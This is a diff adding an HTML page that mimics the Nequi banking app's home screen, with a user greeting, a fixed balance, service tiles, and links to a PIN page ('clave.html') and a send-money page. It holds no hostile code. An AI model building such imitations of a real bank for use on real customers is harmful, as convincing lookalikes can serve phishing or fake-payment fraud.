@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Inicio</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+            color: black;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            text-align: left;
+            width: 100%;
+            max-width: 600px;
+            padding: 20px;
+            box-sizing: border-box;
+            flex: 1;
+            padding-bottom: 70px;
+        }
+
+        .header {
+            background-image: url('img/fondo.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            position: relative;
+            min-height: 250px;
+            overflow: hidden;
+        }
+
+        .header img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            position: absolute;
+            top: 10px;
+            left: 10px;
+        }
+
+        .header .greeting {
+            font-size: 14px;
+            position: absolute;
+            top: 10px;
+            left: 50px;
+        }
+
+        .header .balance, .header .total {
+            position: absolute;
+            font-size: 18px;
+            padding: 10px;
+            border-radius: 5px;
+            color: white;
+            max-width: 90%;
+            box-sizing: border-box;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .header .balance {
+            font-size: 25px;
+            top: 80px;
+            background-color: transparent;
+        }
+
+        .header .total {
+            font-size: 15px;
+            top: 110px;
+            background-color: transparent;
+        }
+
+        .header .back-button, .header .menu-button {
+            position: absolute;
+            top: 20px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .header .back-button {
+            left: 20px;
+        }
+
+        .header .menu-button {
+            right: 20px;
+        }
+
+        .favorites, .suggestions {
+            margin: 20px 0;
+        }
+
+        .favorites h2, .suggestions h2 {
+            font-size: 20px;
+            color: black; 
+            margin-bottom: 10px;
+        }
+
+        .items {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            justify-content: flex-start;
+        }
+
+        .items div {
+            flex: 1 1 100px;
+            max-width: 100px;
+            text-align: center;
+        }
+
+        .items img {
+            width: 55px;
+            height: 55px;
+            object-fit: cover;
+        }
+
+        .fixed-bottom {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px;
+            background-color: #f8f8f8;
+            z-index: 1000;
+            box-shadow: 0 -2px 5px rgba(0,0,0,0.2);
+        }
+
+        .fixed-bottom .items {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .fixed-bottom .items div {
+            background-color: #f8f8f8;
+            padding: 5px;
+            border-radius: 5px;
+            text-align: center;
+            flex: 1;
+            margin: -10px;
+        }
+
+        .fixed-bottom .items div img {
+            width: 45px;
+            height: 45px;
+        }
+        
+        .fixed-bottom .items div:last-child {
+            background-color: transparent;
+            padding: 0;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="greeting">Hola,<br>Luis</div>
+            <div class="bajo"><br><br><br>Depósito Bajo Monto</div>
+            <br>
+            <div class="balance">$ 170,42</div>
+            <br>
+            <div class="total">Total $ 170,42</div>
+            <button class="back-button" onclick="goBack()">←</button>
+            <button class="menu-button">⋮</button>
+        </div>
+
+        <div class="favorites">
+            <h2>Tus favoritos</h2>
+            <div class="items">
+                <div>
+                    <img src="img/celular.png" alt="Paquetes de celular">
+                    <div>Paquetes de celular</div>
+                </div>
+                <div>
+                    <img src="img/colchon.png" alt="Colchón">
+                    <div>Colchón</div>
+                </div>
+                <div>
+                    <img src="img/bolsillo.png" alt="Bolsillos">
+                    <div>Bolsillos</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="suggestions">
+            <h2>Sugeridos Nequi</h2>
+            <div class="items">
+                <div>
+                    <img src="img/celular.png" alt="Paquetes de celular">
+                    <div>Paquetes de celular</div>
+                </div>
+                <div>
+                    <img src="img/qr.png" alt="QR Negocios">
+                    <div>QR Negocios</div>
+                </div>
+                <div>
+                    <img src="img/prestamos.png" alt="Préstamos">
+                    <div>Préstamos</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed-bottom">
+        <div class="items">
+            <div onclick="navigateTo('movimientos')">
+                <img src="img/movimientos.png" alt="Movimientos">
+                <div>Movimientos</div>
+            </div>
+            <div onclick="navigateTo('servicios')">
+                <img src="img/servicios.png" alt="Servicios">
+                <div>Servicios</div>
+            </div>
+            <div onclick="navigateTo('dinero')">
+                <img src="img/dinero.png" alt="Dinero">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function goBack() {
+            window.location.href = "clave.html";
+        }
+
+        function navigateTo(page) {
+            if (page === 'dinero') {
+                window.location.href = "envia_plata.html";
+            } else {
+                alert(`Navegando a ${page}`);
+            }
+        }
+    </script>
+</body>
+</html>
